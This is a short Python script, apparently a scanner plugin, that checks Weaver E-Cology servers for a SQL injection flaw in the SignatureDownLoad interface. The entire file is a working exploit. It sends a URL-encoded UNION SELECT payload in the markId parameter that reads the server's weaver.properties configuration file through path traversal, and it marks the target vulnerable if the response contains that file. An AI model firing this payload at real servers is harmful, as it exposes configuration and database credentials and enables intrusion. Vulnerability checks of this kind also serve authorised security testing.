import requests
import urllib

def verify(url):
    relsult = {
        'name': '泛微E-Cology系统接口SignatureDownLoad存在SQL注入漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close'
    }
    vurl = urllib.parse.urljoin(url, "/weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27../ecology/WEB-INF/prop/weaver.properties%27")
    try:
        response = requests.get(vurl, headers=headers, timeout=3)
        if response.status_code == 200 and 'cology' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult